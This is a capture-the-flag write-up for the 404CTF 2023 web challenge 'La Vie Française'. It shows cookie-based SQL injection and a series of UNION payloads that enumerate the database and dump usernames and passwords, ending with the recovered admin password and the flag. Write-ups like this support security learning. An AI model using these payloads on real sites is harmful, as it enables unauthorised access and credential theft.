---
title: CTFs | 404CTF_2023 | Web | La Vie Française
author: BatBato
date: 2023-06-05
categories: [CTFs, 404CTF_2023, Web]
tags: [Web,SQLi]
permalink: /CTFs/404CTF_2023/Web/La_Vie_Française
---

#  La Vie Française 

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/c9b626a5-80c6-4c86-83f5-cc1df24d5ea4)

When we arrive in this challenge, we access a web page where we can create an account by clicking on `Postuler`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/8fdd4667-93c3-460a-bb14-ae3617e461db)

Because I am someone really original, I created the user `a` with the password... `a`. We then can connect using this account and we arrive to the `account` page:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/6209b847-5795-4e43-a579-1da71c8650c6)

At first I tried some SQLi on the previous forms without luck. I noticed that we have a `uuid` cookie and start looking about this on the web. Still nothing. I remembered of a challenge on WebGoat that used SQLi on cookies and when I tried `XXX' OR True -- -` I was now connected as `jacquesrival`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/ba684ae7-9a99-4b76-9f4a-4c90cade13c9)

I tried using the `XXX' OR True ORDER BY 3 -- -` command to access user `madeleineforestier` that have administrator right, but even connected with this technique to this admin user this wasn't enough. I tried a basic `UNION` based attack to recover information in the database and found that there was 3 columns using the command `XXX' UNION Select '1','2',3 -- -`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/9f2adc8f-b8c2-4529-87b7-41f123e9cdc1)

> Note that only the param `1` and `2` are displayed so no need to set the value of the third parameter
{: .prompt-tip}

We can now use the command `XXX' UNION Select '1',group_concat(0x7c,schema_name,0x7c),3 from information_schema.schemata -- -` to dump all the databases:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/415c774c-3701-4715-af20-fcfb12082281)

We can see that the database we are looking for is named `usersdb`. We can now run the command `XXX' UNION select group_concat(0x7c,TABLE_NAME,0x7c),group_concat(0x7c,TABLE_SCHEMA,0x7c),3 from INFORMATION_SCHEMA.TABLES where table_schema='usersdb'-- -` to dump the tables:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/a534b675-70cd-4871-b978-a8377d43db75)

As we can see, for the database `usersdb`, there is only one table called `users`. We can now list all the column name of this table using the command `XXX' UNION select group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c),3 from INFORMATION_SCHEMA.COLUMNS where table_name='users' -- -`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/2fd3342e-1f4e-4d1e-a7df-7c21b87e501c)

We can see that there is the `username` and `password` attribute that we may want to dump using the command `XXX' UNION select group_concat(0x7c,username,0x7c),group_concat(0x7c,password,0x7c),3 from users -- -`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/35737ca8-be1c-43b0-a41b-eb9d954661ac)

We see a list of password... We can try connecting to the `madeleineforestier` account using the password `fo2DVkgShz2pPJ` and now when we go to the admin panel:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/61a6abba-9eed-465f-9a08-e0736fd14359)

We get the flag: `404CTF{B3w4Re_th3_d3STruct1v3s_Qu0tes}`




